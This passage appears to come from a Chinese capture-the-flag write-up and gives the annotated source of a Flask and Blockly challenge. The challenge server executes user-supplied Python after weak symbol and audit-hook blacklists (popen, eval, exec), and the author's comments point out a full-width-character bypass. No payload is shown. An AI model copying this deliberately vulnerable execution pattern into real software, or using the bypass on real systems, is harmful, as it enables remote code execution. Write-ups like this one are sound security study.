+</span></span><span class="line"><span class="cl">        &#34;helpUrl&#34;: &#34;&#34;
+</span></span><span class="line"><span class="cl">      }]);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      // Initialize Blockly
+</span></span><span class="line"><span class="cl">      var workspace = Blockly.inject(&#39;blocklyDiv&#39;, {
+</span></span><span class="line"><span class="cl">        toolbox: document.getElementById(&#39;toolbox&#39;),
+</span></span><span class="line"><span class="cl">      });
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      // Handle the button click event
+</span></span><span class="line"><span class="cl">      $(&#39;#saveButton&#39;).click(function() {
+</span></span><span class="line"><span class="cl">        // Convert the Blockly workspace to JSON
+</span></span><span class="line"><span class="cl">        var json = Blockly.serialization.workspaces.save(workspace);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        // Send the JSON to the Flask backend
+</span></span><span class="line"><span class="cl">        $.ajax({
+</span></span><span class="line"><span class="cl">          type: &#39;POST&#39;,
+</span></span><span class="line"><span class="cl">          url: &#39;/blockly_json&#39;,
+</span></span><span class="line"><span class="cl">          data: JSON.stringify(json),
+</span></span><span class="line"><span class="cl">          contentType: &#39;application/json&#39;,
+</span></span><span class="line"><span class="cl">          success: function(response) {
+</span></span><span class="line"><span class="cl">            alert(&#39;JSON sent to backend and received response: &#39; + response);
+</span></span><span class="line"><span class="cl">          },
+</span></span><span class="line"><span class="cl">          error: function(error) {
+</span></span><span class="line"><span class="cl">            alert(&#39;Error sending JSON to backend.&#39;);
+</span></span><span class="line"><span class="cl">          }
+</span></span><span class="line"><span class="cl">        });
+</span></span><span class="line"><span class="cl">      });
+</span></span><span class="line"><span class="cl">    &lt;/script&gt;
+</span></span><span class="line"><span class="cl">  &lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>源码 + 自写注释，注释逻辑：从程序入口点开始看，跳转到其他自定义函数就往自定义函数写，最终写到程序执行结束</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="3" style="--fi-max-shown-lines:30;--fi-line-digit:3;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">unidecode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ast</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">importlib.util</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;JSON_AS_ASCII&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">blacklist_pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;[!</span><span class="se">\&#34;</span><span class="s2">#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[</span><span class="se">\\</span><span class="s2">\]^_`{|}~]&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">module_exists</span><span class="p">(</span><span class="n">module_name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">spec</span> <span class="o">=</span> <span class="n">importlib</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">find_spec</span><span class="p">(</span><span class="n">module_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">spec</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">module_name</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">builtin_module_names</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">spec</span><span class="o">.</span><span class="n">origin</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">std_lib_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="vm">__file__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">spec</span><span class="o">.</span><span class="n">origin</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">std_lib_path</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">spec</span><span class="o">.</span><span class="n">origin</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">verify_secure</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="n">ast</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>  <span class="c1"># 遍历抽象语法树（AST）中的所有节点</span>
+</span></span><span class="line"><span class="cl">        <span class="k">match</span> <span class="nb">type</span><span class="p">(</span><span class="n">node</span><span class="p">):</span>   <span class="c1"># 返回每个节点的类型, 并用match 匹配</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="n">ast</span><span class="o">.</span><span class="n">Import</span><span class="p">:</span>  <span class="c1"># 如果匹配到是 ast.Import 节点类型, 则返回 false</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ERROR: Banned module &#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="n">ast</span><span class="o">.</span><span class="n">ImportFrom</span><span class="p">:</span>  <span class="c1"># 如果匹配到是 ast.ImportFrom 节点类型, 则返回 false</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ERROR: Banned module </span><span class="si">{</span><span class="n">node</span><span class="o">.</span><span class="n">module</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>  <span class="c1"># 如果都没匹配到, 则返回 true</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_for_blacklisted_symbols</span><span class="p">(</span><span class="n">input_text</span><span class="p">):</span> <span class="c1"># 搭配 block_to_python 自定义函数取处理 json 数据</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">blacklist_pattern</span><span class="p">,</span> <span class="n">input_text</span><span class="p">):</span>  <span class="c1"># 将字符与黑名单字符进行匹配，成功则返回true</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">block_to_python</span><span class="p">(</span><span class="n">block</span><span class="p">):</span>  <span class="c1"># 该自定义函数的功能总体为处理请求体取出的 json 数据</span>
+</span></span><span class="line"><span class="cl">    <span class="n">block_type</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span>  <span class="c1"># 取出 &#39;type&#39; 的值</span>
+</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">block_type</span> <span class="o">==</span> <span class="s1">&#39;print&#39;</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">text_block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;inputs&#39;</span><span class="p">][</span><span class="s1">&#39;TEXT&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>  <span class="c1"># 如果取出的 &#39;type&#39; 的值为 &#39;print&#39;, 则继续取内部的 [&#39;inputs&#39;][&#39;TEXT&#39;][&#39;block&#39;]的键值</span>
+</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">text_block</span><span class="p">)</span>  <span class="c1"># 将取出的键值(还是 json 数据)继续给当前自定义函数, 直到得到最终的匹配值返回</span>
+</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;print(</span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">)&#34;</span>  <span class="c1"># 然后将最后匹配好的字符取出给 code</span>
+</span></span><span class="line"><span class="cl">           
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">block_type</span> <span class="o">==</span> <span class="s1">&#39;math_number&#39;</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">                                                <span class="c1"># 如果block_type是 &#39;math_number&#39;, 继续</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">str</span><span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="s1">&#39;fields&#39;</span><span class="p">][</span><span class="s1">&#39;NUM&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">isdigit</span><span class="p">():</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span>  <span class="nb">int</span><span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="s1">&#39;fields&#39;</span><span class="p">][</span><span class="s1">&#39;NUM&#39;</span><span class="p">])</span> <span class="c1"># 如果[&#39;fields&#39;][&#39;NUM&#39;]取出的字符转为字符串后是纯字符串型，则转为int类型并赋值给code</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">block_type</span> <span class="o">==</span> <span class="s1">&#39;text&#39;</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">check_for_blacklisted_symbols</span><span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="s1">&#39;fields&#39;</span><span class="p">][</span><span class="s1">&#39;TEXT&#39;</span><span class="p">]):</span> <span class="c1">#如果block_type是 &#39;text&#39;，则在调用check_for_blacklisted_symbols，继续跟进</span>
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>  <span class="c1"># 返回true, 则code为空</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span>  <span class="s2">&#34;&#39;&#34;</span> <span class="o">+</span> <span class="n">unidecode</span><span class="o">.</span><span class="n">unidecode</span><span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="s1">&#39;fields&#39;</span><span class="p">][</span><span class="s1">&#39;TEXT&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span>  <span class="c1"># 返回flase，则将字符进行unidecode解码(用于处理特殊字符，这里存在特殊字符全角转换绕过)并拼接给code</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">block_type</span> <span class="o">==</span> <span class="s1">&#39;max&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">a_block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;inputs&#39;</span><span class="p">][</span><span class="s1">&#39;A&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b_block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;inputs&#39;</span><span class="p">][</span><span class="s1">&#39;B&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">a_block</span><span class="p">)</span>    <span class="c1">#如果类型是max，则取出 [&#39;inputs&#39;][&#39;A&#39;/&#39;B&#39;][&#39;block&#39;]的值丢给当前自定义函数继续执行, 直到得到最终的匹配值返回</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">b_block</span><span class="p">)</span>    
+</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span>  <span class="sa">f</span><span class="s2">&#34;max(</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s2">)&#34;</span>    <span class="c1"># 然后将最后匹配好的字符取出给 code</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">block_type</span> <span class="o">==</span> <span class="s1">&#39;min&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">a_block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;inputs&#39;</span><span class="p">][</span><span class="s1">&#39;A&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b_block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;inputs&#39;</span><span class="p">][</span><span class="s1">&#39;B&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">a_block</span><span class="p">)</span>   <span class="c1"># #如果类型是max，则取出 [&#39;inputs&#39;][&#39;A&#39;/&#39;B&#39;][&#39;block&#39;]的值丢给当前自定义函数继续执行, 直到得到最终的匹配值返回</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">b_block</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span>  <span class="sa">f</span><span class="s2">&#34;min(</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s2">)&#34;</span>   <span class="c1"># 然后将最后匹配好的字符取出给 code</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;next&#39;</span> <span class="ow">in</span> <span class="n">block</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;next&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">+=</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">block</span><span class="p">)</span><span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">code</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">code</span>  <span class="c1"># 最终将参数code返回</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">json_to_python</span><span class="p">(</span><span class="n">blockly_data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">block</span> <span class="o">=</span> <span class="n">blockly_data</span><span class="p">[</span><span class="s1">&#39;blocks&#39;</span><span class="p">][</span><span class="s1">&#39;blocks&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>  <span class="c1"># 取出 json 数据的 [&#39;blocks&#39;][&#39;blocks&#39;][0], 就是走过两个 blocks 元素后取出内部的键值(一个内嵌的json数据)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">python_code</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">python_code</span> <span class="o">+=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">block</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>  <span class="c1"># 将取出的数据丢给自定义函数 block_to_python, 继续跟进到block_to_python内部</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">python_code</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">do</span><span class="p">(</span><span class="n">source_code</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hook_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;  
+</span></span></span><span class="line"><span class="cl"><span class="s1">def my_audit_hook(event_name, arg):
+</span></span></span><span class="line"><span class="cl"><span class="s1">    blacklist = [&#34;popen&#34;, &#34;input&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;compile&#34;, &#34;memoryview&#34;]
+</span></span></span><span class="line"><span class="cl"><span class="s1">    if len(event_name) &gt; 4:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        raise RuntimeError(&#34;Too Long!&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s1">    for bad in blacklist:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        if bad in event_name:
+</span></span></span><span class="line"><span class="cl"><span class="s1">            raise RuntimeError(&#34;No!&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">__import__(&#39;sys&#39;).addaudithook(my_audit_hook)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">source_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="n">hook_code</span> <span class="o">+</span> <span class="n">source_code</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tree</span> <span class="o">=</span> <span class="nb">compile</span><span class="p">(</span><span class="n">source_code</span><span class="p">,</span> <span class="s2">&#34;run.py&#34;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">ast</span><span class="o">.</span><span class="n">PyCF_ONLY_AST</span><span class="p">)</span>  <span class="c1"># flags=ast.PyCF_ONLY_AST, 这指定了将字符串编译为抽象语法树, 而不是编译成可执行的字节码</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">verify_secure</span><span class="p">(</span><span class="n">tree</span><span class="p">):</span>  <span class="c1"># 继续跟进到 verify_secure() 自定义函数, 返回 true 则往下执行</span>
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;run.py&#34;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>  <span class="c1"># 将 code(hook_code 和 传入的值拼接的字符串) 写入 run.py 文件中</span>
+</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;python&#39;</span><span class="p">,</span> <span class="s1">&#39;run.py&#39;</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>  <span class="c1"># 用 python 运行 run.py 并捕获执行结果传入给 result</span>
+</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;run.py&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">result</span> <span class="c1"># 返回执行结果</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>  <span class="c1"># 返回 false 则返回报错字符串</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;Execution aborted due to security concerns.&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;run.py&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Timeout!&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">app</span><span class="o">.</span><span class="n">send_static_file</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>   <span class="c1"># 访问网站根目录，返回 index.html 静态文件给客户端</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/blockly_json&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>  <span class="c1"># 当请求 /blockly_json 且请求方式为 POST 时执行下面代码</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">blockly_json</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">blockly_data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_data</span><span class="p">()</span>  <span class="c1"># 返回 data 请求体, 这里是 json 数据</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">blockly_data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">blockly_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">blockly_data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span> <span class="c1"># 将 JSON 格式的字符串解析为 Python 对象, 这样才能对字符串进行python操作</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">blockly_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">python_code</span> <span class="o">=</span> <span class="n">json_to_python</span><span class="p">(</span><span class="n">blockly_data</span><span class="p">)</span>  <span class="c1"># 调用 json_to_python 自定义函数，这里跟进到 json_to_python 自定义函数中去</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">do</span><span class="p">(</span><span class="n">python_code</span><span class="p">)</span> <span class="c1"># 跟进到 do 自定义函数</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Error generating Python code&#34;</span><span class="p">,</span> <span class="s2">&#34;details&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)})</span>  <span class="c1"># 将报错及字典内容转换为 json 响应格式, 并将内容返回给客户端</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>程序会先将输入的数据进行处理，并与 <code>hook_code</code> 进行拼接，然后将拼接后的内容写入 <code>run.py</code> 并执行，返回执行结果</p>
+<p>hook_code，关键代码块如下，当输入 xxx 时，程序会将输入的字符拼接在下面并执行代码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">my_audit_hook</span><span class="p">(</span><span class="n">event_name</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;popen&#34;</span><span class="p">,</span> <span class="s2">&#34;input&#34;</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">,</span> <span class="s2">&#34;exec&#34;</span><span class="p">,</span> <span class="s2">&#34;compile&#34;</span><span class="p">,</span> <span class="s2">&#34;memoryview&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">event_name</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;Too Long!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">bad</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">bad</span> <span class="ow">in</span> <span class="n">event_name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;No!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
